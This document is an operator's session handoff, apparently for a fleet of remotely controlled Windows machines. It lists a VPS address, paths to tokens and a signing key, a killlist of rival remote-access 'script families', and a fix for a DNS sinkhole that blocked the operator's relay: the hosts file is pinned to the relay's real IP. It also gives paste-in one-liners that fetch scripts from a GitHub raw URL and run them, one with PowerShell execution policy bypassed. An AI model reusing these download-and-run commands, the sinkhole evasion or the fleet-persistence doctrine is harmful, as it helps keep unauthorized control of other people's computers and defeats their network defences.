# Session handoff — 2026-08-06

Repo `main` pushed through **`d503cfc`**. Ops scripts/logs/secrets now live under `Project\ops\` (Desktop cleaned).

## Live systems
- Sight: https://debian.seczio.com/sight
- Tokens: `ops\secrets\admin_token.txt`, `ops\secrets\fetch_token.txt` (also mirrored paths below)
- Sign key: `ops\secrets\winrtcs_keys\sign_private.pem` (build also checks `Desktop\winrtcs_keys` historically)
- VPS: `winrtcs@144.172.107.56` / `~/.ssh/winrtcs_ed25519`
- Repo mirror: `/opt/winrtcs/repo/` (sudo cp from `/tmp` — root-owned)
- Gryxa FP: `36e506ff016b2151` @ `update.gryxa.com` → real IP **`209.145.55.189`**
- Keepers: `5f6010579852e507` @ sevrz · `f861c8140d453427` (shared FP — often abused by **pluxn**)

## Shipped today (C34 / anti)
| Piece | Commit / note |
|---|---|
| `winrtcs_anti.cmd` + `.ps1` | **a74a1d3** — purge competing stacks; **no** always-R3; never touch Gryxa/keepers |
| Killlist C34 | SCWatchdog / zytrx / uvexr / pulsv / pluxn / Tactical / vexlm IOCs |
| Sidekick **0.1.3** | Fallback patterns for C34 |
| `winrtcs_vexlm_purge.*` | **ec6e3ee** — gonzo/vexlm one-shot (always-R3; do **not** blast ALL) |
| `winrtcs_fix_gryxa_dns.ps1` | **bdd6677** — hosts pin + public DNS when Gryxa sinkholed to `127.x` |
| `winrtcs_probe_gryxa_conn.ps1` | **d503cfc** — per-FP EST relay map |
| Yoga / R3b | earlier: `winrtcs_yoga_purge_recover.cmd`, `winrtcs_gryxa_r3b.cmd` |

## Fleet queue today
- **638** ALL force Hunt (new killlist)
- **639** ALL `winrtcs_anti` **PURGE-ONLY** (Gryxa-safe)
- Heal/R3 only on demand per host

## Critical incident — RRFD1-4-VS-SLOT
- Symptom: Gryxa service **RUNNING**, console **offline**
- Root cause: DNS sinkhole — `update.gryxa.com` / `ui.gryxa.com` → **`127.220.0.2`** (local DNS `192.168.0.3` lies; even “8.8.8.8” answers were intercepted)
- Fix: pin hosts → `209.145.55.189 update.gryxa.com` + `ui.gryxa.com`; restart Gryxa
- Verified: `EST 209.145.55.189:443` on Gryxa FP; curl ui/update HTTP 200
- Note: `f861` on that host still relays to **`update.pluxn.com`** (`209.126.7.3`) — leave alone until targeted pluxn strip (do not kill FP blindly)

## Competing script families catalogued (gists)
| Family | Keep / install | Kill us? |
|---|---|---|
| SCWatchdog (zytrx/uvexr/pulsv) | their SC + WMI/tasks | yes |
| KeepTwo / SCCleanup | `f861` + `3d23696` | kills Gryxa + `5f601057` |
| pluxn RMMCleanup / migrate / Tactical | `f861` + `3d23696` + `control.pluxn.com` | yes |
| vexlm / gonzo / MSServices | `9dd7e861`… | yes |
| Crypto login checker gist | n/a | not RMM — out of ANTI scope |

Hostile SC FPs: `194b6f62`, `857e707f`, `89a1ede2`, `3d23696c`, `9dd7e861`, `3a607f4e`, `d4212f02`

## Desired state (only)
- Gryxa `36e506ff016b2151`
- Keepers `5f601057` + `f861c814` (sevrz — watch pluxn hijack of f861)
- WinRTCS under `C:\ProgramData\WinRTCS`

## Ops doctrine (do not regress)
1. **ALL-safe = purge-only.** Never blast R3 / shared ProductCode `/x` fleet-wide.
2. Service RUNNING ≠ console online — check DNS + `EST` to real relay IP.
3. Never `msiexec /x` shared PC in anti purge; heal ladder = soft-start → R3 only if missing.
4. Never delete `f861` by FP alone (ours + pluxn’s).
5. Guest cmd ~60s / `$` stripped — schtasks SYSTEM + batch probes.
6. VPS repo files are root-owned — upload `/tmp` then `sudo cp`.

## Preferred Guest pastes
```bat
REM Fleet-safe anti (purge only)
curl.exe -L --ssl-no-revoke -o C:\Users\Public\winrtcs_anti.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_anti.cmd & call C:\Users\Public\winrtcs_anti.cmd

REM Heal only if Gryxa down
curl.exe -L --ssl-no-revoke -o C:\Users\Public\winrtcs_anti.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_anti.cmd & call C:\Users\Public\winrtcs_anti.cmd --heal

REM DNS sinkhole fix (Gryxa offline but service running)
curl.exe -L --ssl-no-revoke -o C:\Users\Public\fix_gryxa_dns.ps1 https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_fix_gryxa_dns.ps1 & powershell -NoP -EP Bypass -File C:\Users\Public\fix_gryxa_dns.ps1
```

## Local layout (after cleanup)
```
Desktop\Project\          ← single project folder (git repo)
  SESSION_HANDOFF.md      ← this file
  winrtcs_*.cmd/ps1/...   ← fleet payloads
  ops\
    *.py                  ← Sight/VPS helpers (was loose on Desktop)
    logs\                 ← probe/purge text dumps
    secrets\              ← tokens + winrtcs_keys (gitignored)
```

## Tomorrow candidates
- Census after anti 639 — `--heal` only hosts with Gryxa not RUNNING / not EST to `209.145.55.189`
- Detect DNS sinkhole in guard/anti (flag if gryxa resolves `127.*`)
- Targeted pluxn strip for `f861@update.pluxn.com` without killing sevrz f861
- YOGA / TOMSLAPTOP / DUCK follow-up if still stale
- Harden `winrtcs_gryxa_recover` UI MSI fetch (TLS fail → repo MSI path already exists; prefer UI)
